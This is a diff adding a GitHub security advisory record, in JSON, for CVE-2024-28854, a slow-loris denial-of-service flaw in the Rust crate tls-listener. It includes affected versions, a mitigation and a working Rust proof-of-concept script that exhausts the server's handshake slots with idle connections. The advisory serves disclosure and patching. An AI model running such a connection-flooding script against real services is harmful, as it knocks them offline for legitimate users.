@@ -1,0 +1,80 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-2qph-qpvm-2qf7",
+  "modified": "2024-05-20T15:29:52Z",
+  "published": "2024-03-15T19:57:22Z",
+  "aliases": [
+    "CVE-2024-28854"
+  ],
+  "summary": "tls-listener affected by the slow loris vulnerability with default configuration",
+  "details": "### Summary\nWith the default configuration of tls-listener, a malicious user can open 6.4 `TcpStream`s a second, sending 0 bytes, and can trigger a DoS.\n\n### Details\nThe default configuration options make any public service using `TlsListener::new()` vulnerable to a slow-loris DoS attack.\n\n```rust\n/// Default number of concurrent handshakes\npub const DEFAULT_MAX_HANDSHAKES: usize = 64;\n/// Default timeout for the TLS handshake.\npub const DEFAULT_HANDSHAKE_TIMEOUT: Duration = Duration::from_secs(10);\n```\n\n### PoC\n\nRunning the HTTP TLS server example: https://github.com/tmccombs/tls-listener/blob/6c57dea2d9beb1577ae4d80f6eaf03aad4ef3857/examples/http.rs, then running the following script will prevent new connections to the server.\n\n```rust\nuse std::{net::ToSocketAddrs, time::Duration};\nuse tokio::{io::AsyncReadExt, net::TcpStream, task::JoinSet};\n\n#[tokio::main]\nasync fn main() {\n    const N: usize = 1024;\n    const T: Duration = Duration::from_secs(10);\n\n    let url = \"127.0.0.1:3000\";\n    let sockets: Vec<_> = url\n        .to_socket_addrs()\n        .unwrap()\n        .inspect(|s| println!(\"{s:?}\"))\n        .collect();\n\n    let mut js = JoinSet::new();\n\n    let mut int = tokio::time::interval(T / (N as u32) / (sockets.len() as u32));\n    int.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Burst);\n    for _ in 0..10000 {\n        for &socket in &sockets {\n            int.tick().await;\n            js.spawn(async move {\n                let mut stream = TcpStream::connect(socket).await.unwrap();\n                let _ = tokio::time::timeout(T, stream.read_to_end(&mut Vec::new())).await;\n            });\n        }\n    }\n\n    while js.join_next().await.is_some() {}\n}\n\n```\n\n### Impact\n\nThis is an instance of a [slow-loris attack](https://en.wikipedia.org/wiki/Slowloris_(computer_security)). This impacts any publically accessible service using the default configuration of `tls-listener`\n\n\n### Mitigation\n\nPrevious versions can mitigate this by passing a large value, such as `usize::MAX` as the parameter to `Builder::max_handshakes`.",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "crates.io",
+        "name": "tls-listener"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.10.0"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "<= 0.9.1"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/tmccombs/tls-listener/security/advisories/GHSA-2qph-qpvm-2qf7"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-28854"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/tmccombs/tls-listener/commit/d5a7655d6ea9e53ab57c3013092c5576da964bc4"
+    },
+    {
+      "type": "WEB",
+      "url": "https://en.wikipedia.org/wiki/Slowloris_(computer_security)"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/tmccombs/tls-listener"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/tmccombs/tls-listener/releases/tag/v0.10.0"
+    },
+    {
+      "type": "WEB",
+      "url": "https://rustsec.org/advisories/RUSTSEC-2024-0341.html"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-400"
+    ],
+    "severity": "HIGH",
+    "github_reviewed": true,
+    "github_reviewed_at": "2024-03-15T19:57:22Z",
+    "nvd_published_at": "2024-03-15T19:15:07Z"
+  }
+}
